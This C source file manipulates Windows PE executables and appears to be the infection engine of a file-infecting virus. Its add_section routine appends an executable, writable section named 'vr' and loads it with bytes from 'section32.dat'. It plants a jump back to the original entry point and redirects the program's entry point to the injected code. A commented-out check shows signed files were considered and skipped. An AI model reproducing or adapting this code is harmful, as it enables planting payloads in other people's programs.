#include "common.h"

void vr_memcpy(char* dst, char* src, size_t n )
{
	while(n--) *dst++ = *src++;
}

void vr_strcpy(char* dst, char* src)
{
	do *dst++ = *src++; while(*src);
}

DWORD _stdcall alignment(DWORD size, DWORD alignment)
{
	return (size%alignment) ? (size/alignment+1)*alignment : (size/alignment)*alignment;
}


DWORD add_section(PVR_PE_FILE pe_file)
{
	VR_ERROR result =VR_NO_ERROR;
	PVR_SECTION iterator;
	PVR_SECTION prev =NULL;
        PVR_SECTION ptr =NULL;
	DWORD size_low;
	DWORD size_high;
	HANDLE file;
	DWORD rva =0;
	DWORD rva_temp;
	DWORD bytes;
	int i;
	VR_SMART_UNION rel32;

	if(VR_FLAG_SECTION_TABLE_FULL & pe_file->flags) return VR_ERROR_SECTION_TABLE_FULL;
  //      if(VR_FLAG_SECURITY_FIND & pe_file->flags) return VR_ERROR_SECURITY_FIND;

	if(pe_file->section_list)
	{
	do	
	{	

		for(iterator =pe_file->section_list; iterator; iterator=iterator->next)
		{
			rva_temp =iterator->VirtualAddress +alignment(iterator->VirtualSize, pe_file->OptionalHeader->SectionAlignment);

			rva =(rva_temp > rva) ? rva_temp : rva;
			prev =iterator;
	        }

		if(!rva || !prev)
		{
			result =VR_NULL_PTR;
			break;
		}

		file =CreateFile("section32.dat",GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
		if(INVALID_HANDLE_VALUE == file)
		{	
			result = GetLastError();
			break;
		}
		
		size_low =GetFileSize(file, &size_high);
		if(0 != size_high)
		{	
			break;
		}

		ptr =(PVR_SECTION) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(VR_SECTION));
		if(!ptr)
 		{
				result =VR_NO_MEMORY;
				break;
			  
		}

		vr_strcpy(ptr->Name, "vr");

		ptr->VirtualSize =alignment(size_low, pe_file->OptionalHeader->SectionAlignment);
		ptr->VirtualAddress =rva;
		ptr->FileSize =alignment(size_low, pe_file->OptionalHeader->FileAlignment);
		ptr->FileAddress =pe_file->total_size;
		ptr->Characteristics=0xe0000020;

		ptr->data_buffer =(unsigned char*) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ptr->FileSize);
		if(!ptr->data_buffer)
		{
			result =VR_NO_MEMORY;
			break;
		}

		
                ptr->data_buffer[0]= 0xe9;
		rel32._int=(pe_file->OptionalHeader->AddressOfEntryPoint-ptr->VirtualAddress-5);
                vr_memcpy(ptr->data_buffer+1, rel32._char, sizeof(rel32));

		ReadFile(file, ptr->data_buffer+5, size_low-5, &bytes, NULL);
		
                prev->next=ptr;

                pe_file->FileHeader.NumberOfSections++;
		pe_file->OptionalHeader->SizeOfImage += alignment(size_low, pe_file->OptionalHeader->FileAlignment);
		pe_file->total_size=pe_file->total_size+ptr->FileSize;



		pe_file->OptionalHeader->AddressOfEntryPoint=ptr->VirtualAddress;


	} while(0);

	CloseHandle(file);

	}

	return result;
}

VR_ERROR write_section(HANDLE file,PVR_PE_FILE pe_file)
{
	VR_ERROR result =VR_NO_ERROR;
	PVR_SECTION iterator;
        PIMAGE_SECTION_HEADER ptr=NULL;
	DWORD bytes;
	int i;

	iterator =pe_file->section_list;

	ptr=(PIMAGE_SECTION_HEADER) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(IMAGE_SECTION_HEADER));
	if(NULL==ptr)
	{
		result =VR_NO_MEMORY;
		return result;
	}

	for(i=0; i < pe_file->FileHeader.NumberOfSections; i++)
	{
		// not checking for NULL iterator
		
		memcpy(ptr->Name,iterator->Name,IMAGE_SIZEOF_SHORT_NAME);

		ptr->Misc.VirtualSize=iterator->VirtualSize;
		ptr->VirtualAddress=iterator->VirtualAddress;
		ptr->SizeOfRawData=iterator->FileSize;
		ptr->PointerToRawData=iterator->FileAddress;
		ptr->Characteristics=iterator->Characteristics;

		if(!WriteFile(file, ptr, sizeof(IMAGE_SECTION_HEADER), &bytes, NULL))
		{
			result =(VR_WINDOWS_ERROR | GetLastError());
			break;
		}

		if(bytes!=sizeof(IMAGE_SECTION_HEADER))
		{
			result =VR_PARTIAL_WRITE;
			break;
		}

		iterator =iterator->next;
	}
		
	iterator =pe_file->section_list;

	if(iterator->data_buffer)
	{
		do
		{
			SetFilePointer(file, iterator->FileAddress, NULL, FILE_BEGIN);

			if(!WriteFile(file, iterator->data_buffer, iterator->FileSize, &bytes, NULL))
			{
				result =(VR_WINDOWS_ERROR | GetLastError());
				break;
			}

			if(bytes!=iterator->FileSize)
			{
				result =VR_PARTIAL_WRITE;
				break;
			}

			iterator =iterator->next;

		} while(iterator);
	}
				
	if(ptr) HeapFree(GetProcessHeap(), 0, ptr);
	
	return result;
}

VR_ERROR read_section(unsigned char* buffer, PVR_PE_FILE pe_file)
{
	PIMAGE_SECTION_HEADER section;
	PVR_SECTION iterator;
        PVR_SECTION ptr=NULL;
	int i;
	VR_ERROR result =VR_NO_ERROR;
	PIMAGE_DOS_HEADER dos_header =(PIMAGE_DOS_HEADER) buffer;
	PIMAGE_NT_HEADERS nt =(PIMAGE_NT_HEADERS) (buffer + dos_header->e_lfanew);
	unsigned char* temp;
	DWORD min_RVA =0xffffffff;
	DWORD size;
	int j;
	
	section =(PIMAGE_SECTION_HEADER)(buffer + dos_header->e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER) + nt->FileHeader.SizeOfOptionalHeader);
	size=dos_header->e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER) + nt->FileHeader.SizeOfOptionalHeader;

		
	if(size+sizeof(IMAGE_SECTION_HEADER)*(pe_file->FileHeader.NumberOfSections) >= pe_file->total_size)
	{
		result= VR_ERROR_INVALID_SIZE;
		return result;
	}

	for(i=0; i <pe_file->FileHeader.NumberOfSections; i++, section++)
	{
		min_RVA =(min_RVA > section->VirtualAddress) ? section->VirtualAddress : min_RVA;
		pe_file->min_RVA=min_RVA;
	/*	
		if((pe_file->OptionalHeader->SizeOfUninitializedData >=section->Misc.VirtualSize) && (section->Characteristics & IMAGE_SCN_CNT_UNINITIALIZED_DATA))
		{
			result=VR_PACKED_FILE;
			break;
		}

	*/
	        if(!strcmp(section->Name,".reloc"))
		{
			pe_file->flags |=VR_FLAG_VR_RELOC;
		}

		ptr =(PVR_SECTION) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(VR_SECTION));
		if(!ptr)
		{
			result =VR_NO_MEMORY;
			break;
		} else
		{
			memcpy(ptr->Name, section->Name, IMAGE_SIZEOF_SHORT_NAME);

			ptr->VirtualSize=section->Misc.VirtualSize;
			ptr->VirtualAddress=section->VirtualAddress;
			ptr->FileSize=section->SizeOfRawData;
			ptr->FileAddress=section->PointerToRawData;
			ptr->Characteristics=section->Characteristics;

			if(ptr->VirtualSize)
			{
				ptr->data_buffer_size = alignment(ptr->VirtualSize, nt->OptionalHeader.SectionAlignment);
			} else
			{
				if(ptr->FileSize)
				{
					ptr->data_buffer_size = alignment(ptr->FileSize, nt->OptionalHeader.SectionAlignment);
				}
			}

			if(ptr->data_buffer_size)
			{
				ptr->data_buffer =(unsigned char*) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ptr->data_buffer_size);
				if(!ptr->data_buffer)
				{
					result =VR_NO_MEMORY;
					break;
				}

				if(ptr->FileSize)
				{
					__try
					{
						memcpy(ptr->data_buffer, buffer +ptr->FileAddress, (ptr->FileSize > ptr->data_buffer_size) ? ptr->data_buffer_size : ptr->FileSize);

					} __except(1)
					{
						if(ptr)
						{
							if(ptr->data_buffer) HeapFree(GetProcessHeap(), 0, ptr->data_buffer);

							HeapFree(GetProcessHeap(), 0, ptr);
						}

						return VR_ERROR_INVALID_SIZE;
					}
				}
			}

			size+=sizeof(IMAGE_SECTION_HEADER);

			if(pe_file->section_list)
			{
				iterator =pe_file->section_list;

				while(iterator->next) iterator =iterator->next;

				iterator->next =ptr;

			} else pe_file->section_list =ptr;
	        }
	}

	if(VR_NO_ERROR != result)
	{
		if(ptr)
		{
			if(ptr->data_buffer) HeapFree(GetProcessHeap(), 0, ptr->data_buffer);

			HeapFree(GetProcessHeap(), 0, ptr);
		}

		return result;
	}

	temp =(unsigned char*) ++section;

//	printf("DEBUG: ptr =%p ptr-buffer =%#x min_RVA =%#x\r\n", temp, temp -buffer, min_RVA);

	for(j=size;j < (size+sizeof(IMAGE_SECTION_HEADER));j++)
	{
		if(buffer[j])
		{
			//printf("%#02x\r\n",buffer[j]);
			pe_file->flags |=VR_FLAG_SECTION_TABLE_FULL;
			break;
		} 
	}

	if(min_RVA < (temp -buffer))
	{
		pe_file->flags |= VR_FLAG_SECTION_TABLE_FULL;
	}

	return result;
}
